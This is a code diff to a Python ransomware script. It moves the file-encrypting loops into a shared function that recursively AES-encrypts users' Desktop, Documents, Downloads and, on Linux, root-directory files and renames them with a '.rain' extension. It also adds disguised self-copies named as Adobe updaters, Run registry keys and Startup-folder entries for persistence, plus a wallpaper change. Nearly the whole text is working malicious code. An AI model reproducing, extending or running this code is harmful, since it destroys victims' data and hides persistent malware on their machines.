@@ -25,6 +25,22 @@ def crypt(file):
 	ne = os.path.splitext(file)[0]
 	os.rename(file,ne+".rain")
 
+def cryptingcommon(dirct):
+	try:
+		os.chdir(dirct)
+		for i in ext:
+			try:
+				files = glob.iglob(dirct+'/**/'+(i),recursive=True)
+			except:
+				pass
+			for file in files:
+				try:
+					crypt(file)
+				except:
+					pass
+	except:
+		pass
+
 BLOCK_SIZE = 32
 k = Random.new().read(BLOCK_SIZE)
 aes = AES.new(k, AES.MODE_ECB)
@@ -41,7 +57,7 @@ ext=['*.txt','*.lnk','*.application','*.veg','*.doc','*.pdf','*.jpg','*.gif','*.
 ,'*.pptx','*.ppsx','*.ico','*.3gp','*.dxf','*.eps','*.max','*.nrg','*.ogg','*.pic','*.php','*.qxd'
 ,'*.rm','*.swf','*.vob','*.wri','*.vbs','*.chc','*.real','*.list','*.desktop','*.so','*.json','*.new'
 ,'*.bkp','*.bak','*.tmp','*.gho','*.mp3']
-sys = platform.system()
+systema = platform.system()
 
 def infectall():
 	if sys=="Windows":
@@ -64,84 +80,47 @@ def infectall():
 	elif sys=="Linux":
 		exit()
 
-if sys=='Windows':
+if systema=='Windows':
 	try:
 		desktop = os.path.expanduser('~/Desktop')
 		documents = os.path.expanduser('~/Documents')
 		downloads = os.path.expanduser('~/Downloads')
-		appdt = getenv('APPDATA')
+		appdata = getenv('APPDATA')
 	except:
 		pass
 	try:
-		background = open(documents+"bg.jpg",'rb')
+		background = open(documents+"/bg.jpg",'wb')
 		background.write(bg)
 		background.close()
 
 		dest = appdata+"\\Microsoft\\Windows\\Themes"
-		shutil.copy('cav.jpg',dest+"\\TranscodedWallpaper")
+		shutil.copy(documents+"\\bg.jpg",dest+"\\TranscodedWallpaper")
 		system("taskkill /f /IM explorer.exe")
 		system("start C:/Windows/explorer.exe")
 	except:
 		pass
 	try:
-		copyfile(__file__,'C:/Users/Public/')
-		copyfile(__file__,appdata+r'\Microsoft\Windows\Start Menu\Programs\Startup')
+		copyfile(sys.argv[0],'C:/Users/Public/AdobeAAMUpdater.exe')
+		copyfile(sys.argv[0],appdata+r'\Microsoft\Windows\Start Menu\Programs\Startup\AdobeAAMCCUpdater.exe')
+		copyfile(sys.argv[0],documents+'/AdobeAAMComUpdater.exe')
 
-		shutil.copy(__file__,appdata+r'\Microsoft\Windows\Start Menu\Programs\Startup')
-		shutil.copy(__file__,'C:/Users/Public/')
-
+		keypath = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
 		key = CreateKey(HKEY_LOCAL_MACHINE, keypath)
-		p1 = 'C:\\Users\\Public\\'+__file__
-		p2 = appdata+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+__file__
-		SetValueEx(key, "PIDAdobeAAM", 0, REG_SZ, p1)
-		SetValueEx(key, "PIDAdobeAAMCC", 0, REG_SZ, p2)
+		p1 = 'C:\\Users\\Public\\AdobeAAMUpdater.exe'
+		p2 = appdata+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\AdobeAAMUpdater.exe'
+		p3 = documents+'/AdobeAAMComUpdater.exe'
+		SetValueEx(key, "AdobeAAM", 0, REG_SZ, p1)
+		SetValueEx(key, "AdobeAAMCC", 0, REG_SZ, p2)
+		SetValueEx(key, "AdobeAAMCom", 0, REG_SZ, p3)
 	except:
 		pass
-	try:
-		os.chdir(desktop)
-	except:
-		pass
-	for i in ext:
-		try:
-			files = glob.iglob(desktop+'/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				crypt(file)
-			except:
-				pass
-	try:
-		os.chdir(documents)
-	except:
-		pass
-	for i in ext:
-		try:
-			files = glob.iglob(documents+'/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				crypt(file)
-			except:
-				pass
-	try:
-		os.chdir(downloads)
-	except:
-		pass
-	for i in ext:
-		try:
-			files = glob.iglob(downloads+'/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				crypt(file)
-			except:
-				pass
+	
+	cryptingcommon(desktop)
+	cryptingcommon(documents)
+	cryptingcommon(downloads)
 				
 	infectall()
-elif sys=='Linux':
+elif systema=='Linux':
 	desktop = os.path.expanduser('~/Desktop')
 	area = os.path.expanduser('~/Área de trabalho')
 	documents = os.path.expanduser('~/Documents')
@@ -150,80 +129,17 @@ elif sys=='Linux':
 	root = os.path.expanduser('/')
 	
 	try:
-		shutil.copy(__file__,documents)
-		shutil.copy(__file__,documentos)
-		shutil.copy(__file__,root)
+		shutil.copy(sys.argv[0],documents)
+		shutil.copy(sys.argv[0],documentos)
+		shutil.copy(sys.argv[0],root)
 	except:
 		pass
-	try:
-		os.chdir(desktop)
-	except:
-		pass
-	try:
-		os.chdir(area)
-	except:
-		pass
-	for i in ext:
-		try:
-			files = glob.iglob(area+'/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				crypt(file)
-			except:
-				pass
-	for i in ext:
-		try:
-			files = glob.iglob(desktop+'/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				crypt(file)
-			except:
-				pass
-	try:
-		os.chdir(documents)
-	except:
-		pass
-	try:
-		os.chdir(documentos)
-	except:
-		pass
-	for i in ext:
-		try:
-			files = glob.iglob(documentos+'/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				crypt(file)
-			except:
-				pass
-
-	for i in ext:
-			try:
-				files = glob.iglob(documents+'/**/'+(i),recursive=True)
-			except:
-				pass
-			for file in files:
-				try:
-					crypt(file)
-				except:
-					pass
-	try:
-		os.chdir(downloads)
-	except:
-		pass
-	for i in ext:
-		try:
-			files = glob.iglob(downloads+'/**/'+(i),recursive=True)
-		except:
-			pass
-		for file in files:
-			try:
-				crypt(file)
-			except:
-				pass
+	
+	cryptingcommon(desktop)
+	cryptingcommon(area)
+	cryptingcommon(documents)
+	cryptingcommon(documentos)
+	cryptingcommon(downloads)
+	cryptingcommon(root)
+	
 	infectall()
